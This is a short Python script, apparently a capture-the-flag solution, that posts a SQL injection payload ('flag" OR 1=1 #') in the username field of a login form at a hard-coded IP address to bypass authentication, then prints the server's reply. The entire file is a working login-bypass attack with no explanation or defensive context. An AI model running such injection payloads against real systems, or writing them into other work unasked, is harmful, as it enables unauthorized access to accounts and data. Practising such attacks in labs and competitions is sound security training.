#!/usr/local/bin/python3

import requests

url = "http://54.254.115.115:5000"

r = requests.post(url, data = {
  "username": 'flag" OR 1=1 #',
  "password": "plo"
})
content = r.text
print(content)
